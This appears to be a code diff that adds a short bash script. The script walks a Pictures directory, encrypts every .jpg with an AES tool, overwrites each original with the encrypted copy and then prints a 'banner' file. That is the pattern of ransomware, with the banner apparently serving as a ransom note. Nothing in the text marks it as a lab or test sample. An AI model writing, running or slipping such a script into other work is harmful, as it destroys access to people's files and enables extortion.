@@ -1,0 +1,11 @@
+#!/usr/bin/bash
+
+TARGET_DIR="/app/Pictures"
+for file in $(ls $TARGET_DIR); do
+    if [[ $file == *.jpg ]]; then
+        ./aes_tool enc $TARGET_DIR/$file $TARGET_DIR/$file.enc
+        mv $TARGET_DIR/$file.enc $TARGET_DIR/$file
+    fi
+done
+
+cat banner
